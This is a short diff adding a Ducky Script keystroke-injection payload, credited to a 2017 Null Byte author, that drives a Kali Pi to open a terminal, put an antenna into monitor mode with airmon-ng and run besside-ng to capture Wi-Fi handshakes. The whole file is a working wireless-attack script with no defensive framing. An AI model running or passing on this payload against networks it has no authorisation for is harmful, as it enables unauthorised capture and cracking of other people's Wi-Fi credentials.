@@ -1,0 +1,31 @@
+REM This is a tool to start grabbing Wi-Fi handshakes from an attack antenna on the Kali Pi
+REM Sadmin 2017 for Null Byte
+DELAY 5000
+ALT F2
+DELAY 3000
+STRING qterminal
+DELAY 100
+ENTER
+DELAY 5000
+STRING screen
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 5000
+STRING airmon-ng start wlan1
+DELAY 800
+ENTER
+DELAY 800
+ENTER
+DELAY 15000
+STRING besside-ng wlan1mon
+DELAY 800
+ENTER
+DELAY 800
+ENTER
+DELAY 5000
+CTRL a 
+STRING d
+DELAY 50
+ENTER 
